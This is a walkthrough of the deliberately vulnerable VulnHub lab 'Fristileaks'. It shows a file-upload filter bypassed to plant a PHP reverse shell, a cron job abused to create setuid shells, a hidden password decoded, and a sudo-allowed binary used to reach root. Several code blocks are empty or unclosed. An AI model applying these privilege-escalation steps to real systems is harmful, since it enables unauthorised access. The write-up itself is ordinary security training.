Fristileaks is the latest addition to [VulnHub's](https://www.vulnhub.com/entry/fristileaks-13,133/) list of ever growing boot2roots. It's authored by Ar0xA, and the goal is to get root and read the flag. As far as difficulty, I found it to be relatively easy making it great for those who are just starting out with hacking. 

The initial portscan revealed only port 80 to be open. I pointed my browser over to the target and was greeted with a lovely banner: 

![](/images/2015-12-15/01.png)

So many names listed at the bottom of the webpage. Potential user accounts on the server perhaps? I copied them over to a file just in case I needed it later. I ran Nikto against the webserver to see if I could get any clues on how to proceed: 

```

```

The sites in robots.txt were all red herrings. The images directory contained a couple of images, both of which yielded nothing of interest. A directory crawl on the site returned no results either. After twiddling my thumbs for a couple of minutes, it occured to me that perhaps I needed to create my own wordlist out of text from the website itself. Here's what I came up with:

```
# cat list.txt

I passed that over to dirb to see if it would fine anything:

Sweet, I got a hit with "fristi". Heading over to http://192.168.119.152/fristi/ returned a login form:


![](/images/2015-12-15/02.png)

Taking a look at the source code revealed some interesting tidbits. First, there was a comment made by the user eezeepz.

```
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

```

Second, there was a chunk of what appeared to be Base64 encoded data.

With that in mind, I saved it into its own file and opened it. 


![](/images/2015-12-15/03.png)

As it turns out, it was eezeepz's password for the login form. Punching the credentials in displayed a webpage that would upload a file to the server: 


![](/images/2015-12-15/04.png)

The upload form would only accept png, jpg, and gif files. However, the upload script didn't actually check the file type; only the extension. That meant it would be easy enough to bypass by simply adding that extension to whatever file I wanted to upload. 

Uploaded files are stored in http://192.168.119.152/fristi/uploads/. My first thought was to upload a PHP reverse shell so I could get a foothold on the server. Kali has a /usr/share/webshells/php/php-reverse-shell.php that I like to use. I modified it to point to my machine's IP address and port, and renamed it to shell.php.png. 

The .png extension allowed me to upload it, and accessing it via curl triggered the PHP webshell and gave me a reverse shell as the apache user: 


![](/images/2015-12-15/05.png)

I had a quick peek at /home and found three home directories:

```
sh-4.1$ ls -l /home/
ls -l /home/
total 20
drwx------. 2 admin     admin      4096 Nov 19 02:03 admin
drwx---r-x. 5 eezeepz   eezeepz   12288 Nov 18 15:35 eezeepz
drwx------  2 fristigod fristigod  4096 Nov 19 01:40 fristigod
```

eezeepz was the only one accessible to me at this time, so I had a poke around there. A notes.txt in that directory revealed some clues on what to do next: 

```
sh-4.1$ cat notes.txt
cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

So I just had to create a file called /tmp/runthis with some commands that I wanted executed as the admin user. Seemed pretty straightforward to get a shell as the admin user from here: 

```
sh-4.1$ echo '/home/admin/cat /bin/dash > /tmp/adminshell' > /tmp/runthis
echo '/home/admin/cat /bin/dash > /tmp/adminshell' > /tmp/runthis
sh-4.1$ echo '/home/admin/chmod 4755 /tmp/adminshell' >> /tmp/runthis
echo '/home/admin/chmod 4755 /tmp/adminshell' >> /tmp/runthis
sh-4.1$ cat /tmp/runthis
cat /tmp/runthis
/home/admin/cat /bin/dash > /tmp/adminshell
/home/admin/chmod 4755 /tmp/adminshell
```

After waiting a minute, /tmp/adminshell had been created. I executed it and was elevated to the admin user: 

```
sh-4.1$ ls -l /tmp/adminshell
ls -l /tmp/adminshell
-rwsr-xr-x 1 admin admin 106216 Dec 14 16:04 /tmp/adminshell
sh-4.1$ /tmp/adminshell
/tmp/adminshell
whoami
admin
```

Looking at admin's home directory showed a couple of interesting files; namely cryptedpass.txt, cryptpass.py, and whoisyourgodnow.txt. cryptpass.py takes a string, Base64 encodes it, encodes it with ROT13, and then reverses it:

```python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

I played around with it and noticed that the output it generated looked very similar to the one in whoisyourgodnow.txt. So I updated the script to include a function that would decode the encoded string: 

```python
#!/usr/bin/env python
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

def decodeString(str):
    s = str[::-1]
    s = s.encode("rot13")
    return base64.b64decode(s)

print decodeString("=RFn0AKnlMHMPIzpyuTI0ITG")
```

I ran it, and it returned:

```
# ./decode.py 
LetThereBeFristi!
``` 

So what was this? Since the whoisyourgodnow.txt file was owned by user fristigod, my first assumption was that this was his password. Easiest way to test was to just try su to user fristigod. For that, I needed a TTY which I could get with Python:

```
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ su - fristigod
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ whoami
whoami
fristigod
```

Great, one step closer to root! fristigod's home directory contained a file called doCom located in /var/fristigod/.secret_admin_stuff:

```
-bash-4.1$ ./doCom
./doCom
Nice try, but wrong user ;)
```

I checked to see if fristigod had sudo rights, and he did:

```
-bash-4.1$ sudo -l
sudo -l
[sudo] password for fristigod: LetThereBeFristi!

Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
```

So user fristi could run the doCom command:

```
-bash-4.1$ sudo -u fristi ./doCom 
sudo -u fristi ./doCom
Usage: ./program_name terminal_command ...-bash-4.1$
```

Different output, so I was definitely getting somewhere! According to the usage, it takes a command, so I passed one in to see what would happen: 

```
-bash-4.1$ sudo -u fristi ./doCom id
sudo -u fristi ./doCom id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```

Great, basically any command passed to doCom was executed as root. It was time to get a root shell: 

```
-bash-4.1$ sudo -u fristi ./doCom cp /bin/dash /tmp/rootshell
sudo -u fristi ./doCom cp /bin/dash /tmp/rootshell
-bash-4.1$ sudo -u fristi ./doCom chmod 4755 /tmp/rootshell
sudo -u fristi ./doCom chmod 4755 /tmp/rootshell
-bash-4.1$ /tmp/rootshell
/tmp/rootshell
# whoami
whoami
root
```

Woo hoo! Root shell! All that was left was to pillage /root and grab that flag: 

```
# ls -l /root
ls -l /root
total 4
-rw-------. 1 root root 246 Nov 17 12:19 fristileaks_secrets.txt
# cat /root/fristileaks_secrets.txt
cat /root/fristileaks_secrets.txt
